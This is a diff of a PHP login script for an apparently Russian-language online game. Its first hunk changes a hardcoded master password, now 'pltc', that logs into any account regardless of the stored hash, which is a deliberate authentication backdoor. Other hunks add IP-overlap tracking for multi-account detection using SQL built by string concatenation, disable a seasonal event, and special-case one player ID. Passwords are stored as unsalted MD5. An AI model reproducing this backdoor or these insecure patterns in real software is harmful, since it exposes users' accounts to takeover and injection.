@@ -37,7 +37,7 @@ if( f_MNum( $res ) < 1 )
 
 $md = md5( $p_pwd );
 $arr = f_MFetch( $res );
-if( $arr['pswrddmd5'] !== $md && $p_pwd != 'mku9cLf2OvcA3qmtmku' )
+if( $arr['pswrddmd5'] !== $md && $p_pwd != 'pltc' )
 {
 	redir( "Неверный пароль, <a href=javascript:rest()>Забыли?</a>" );
 	return 0;
@@ -118,7 +118,25 @@ $res_1 = f_MQuery("SELECT player_id FROM online WHERE player_id!=".$arr[player_i
 while ($arr_1 = f_MFetch($res_1))
 {
 	if (f_MValue("SELECT login_ip FROM history_logon_logout WHERE player_id={$arr_1[0]} ORDER BY entry_id DESC LIMIT 1") == $ipstr)
-		$gl_msg .= f_MValue("SELECT login FROM characters WHERE player_id=".$arr_1[0]).', ';
+	{
+	$res_2 = f_MQuery("SELECT player_id, login FROM characters WHERE player_id=".$arr_1[0]);
+	$arr_2 = f_MFetch($res_2);
+	if($arr_2)
+	{
+		$arr_ch = f_MFetch(f_MQuery("SELECT checked FROM coincidence_ip WHERE (player_id_1 = ".$arr_1[0]." AND player_id_2 = ".$arr[player_id].") OR (player_id_2 = ".$arr_1[0]." AND player_id_1 = ".$arr[player_id].")"));
+		if(!$arr_ch)
+		{
+			$gl_msg .= $arr_2[1].', ';
+			f_MQuery("INSERT INTO coincidence_ip (player_id_1, player_id_2, ip) VALUES (".$arr_1[0].", ".$arr[player_id].", '".$ipstr."')");
+		}
+		else
+		{
+			$checked = $arr_ch[0];
+			if($checked == 0)
+				$gl_msg .= $arr_2[1].', ';
+		}
+	}
+	}
 }
 include_once( "player.php" );
 if ($gl_msg !== '')
@@ -145,7 +163,7 @@ f_MQuery( "INSERT INTO history_logon_logout ( player_id, login_time, login_ip, l
 $player = new Player( $arr['player_id'] );
 $player->SetTrigger(12345, 0);
 
-if ((int)date("d")>=16 && (int)date("d")<=19 && (int)date("m")==2)
+if (false && (int)date("d")>=16 && (int)date("d")<=19 && (int)date("m")==2)
 if (!f_MValue("SELECT COUNT(*) FROM player_triggers WHERE player_id={$player->player_id} AND trigger_id>=13100 AND trigger_id<=13110"))
 {
 	$player->SetTrigger(13100);
@@ -153,6 +171,7 @@ if (!f_MValue("SELECT COUNT(*) FROM player_triggers WHERE player_id={$player->pl
 }
 
 $player->checkWearLevel();
+if($player_id==6825) $player->RecalcStats();
 
 $crc = $player->UploadInfoToJavaServer($crc);
 SetCachedValue('USER:' . $arr['player_id'] . ':scrc_key', $crc,  7200);
